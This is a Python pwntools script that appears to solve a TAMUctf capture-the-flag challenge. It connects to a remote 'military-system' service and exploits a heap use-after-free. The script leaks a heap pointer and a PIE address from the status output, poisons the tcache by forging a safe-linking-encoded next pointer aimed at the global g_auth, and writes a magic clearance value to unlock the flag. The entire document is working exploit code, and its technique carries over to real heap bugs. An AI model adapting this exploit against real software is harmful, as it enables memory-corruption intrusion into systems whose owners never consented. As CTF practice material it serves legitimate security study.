import re
from pathlib import Path

from pwn import *


HOST = "streams.tamuctf.com"
PORT = 443
SNI = "military-system"

HERE = Path(__file__).resolve().parent
BIN = ELF(str(HERE / "military-system"), checksec=False)
MAGIC_CLEARANCE = 0x00000007434F4D44
STATUS_HOOK_OFF = BIN.symbols["render_status"]
G_AUTH_OFF = BIN.symbols["g_auth"]


def start():
    return remote(HOST, PORT, ssl=True, sni=SNI)


def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def open_channel(io, slot, callsign):
    menu(io, 1)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendafter(b"Callsign: ", callsign + b"\n")


def queue_message(io, slot, size, data):
    assert 64 <= size <= 128
    assert len(data) == size
    menu(io, 2)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendlineafter(b"Draft bytes (64-128): ", str(size).encode())
    io.sendafter(f"Draft payload ({size} bytes): ".encode(), data)


def edit_draft(io, slot, span, data):
    assert len(data) == span
    menu(io, 3)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    io.sendlineafter(b"Editor span: ", str(span).encode())
    io.sendafter(f"Patch bytes ({span}): ".encode(), data)


def close_channel(io, slot):
    menu(io, 4)
    io.sendlineafter(b"Slot: ", str(slot).encode())


def view_status(io, slot):
    menu(io, 5)
    io.sendlineafter(b"Slot: ", str(slot).encode())
    return io.recvuntil(b"1. Open channel", drop=False)


def transmit_report(io, slot):
    menu(io, 6)
    io.sendlineafter(b"Slot: ", str(slot).encode())


def main():
    io = start()

    size = 128

    open_channel(io, 0, b"A")
    open_channel(io, 1, b"B")

    queue_message(io, 0, size, b"A" * size)
    queue_message(io, 1, size, b"B" * size)

    close_channel(io, 1)
    close_channel(io, 0)

    status = view_status(io, 0).decode()

    draft_ptr = int(re.search(r"last_draft=(0x[0-9a-fA-F]+)", status).group(1), 16)
    status_hook = int(re.search(r"diagnostic_hook=(0x[0-9a-fA-F]+)", status).group(1), 16)

    pie_base = status_hook - STATUS_HOOK_OFF
    g_auth = pie_base + G_AUTH_OFF

    encoded_next = g_auth ^ (draft_ptr >> 12)
    edit_draft(io, 0, 8, p64(encoded_next))

    open_channel(io, 0, b"C")
    queue_message(io, 0, size, b"C" * size)

    open_channel(io, 1, b"D")
    payload = bytearray(b"X" * size)
    payload[32:40] = p64(MAGIC_CLEARANCE)
    queue_message(io, 1, size, bytes(payload))

    transmit_report(io, 1)

    output = io.recvrepeat(2)
    match = re.search(rb"gigem\{[^}]+\}", output)
    if not match:
        log.failure("flag not found")
        io.interactive(prompt="")
        return

    flag = match.group(0).decode()
    log.success(flag)
    print(flag)


if __name__ == "__main__":
    main()
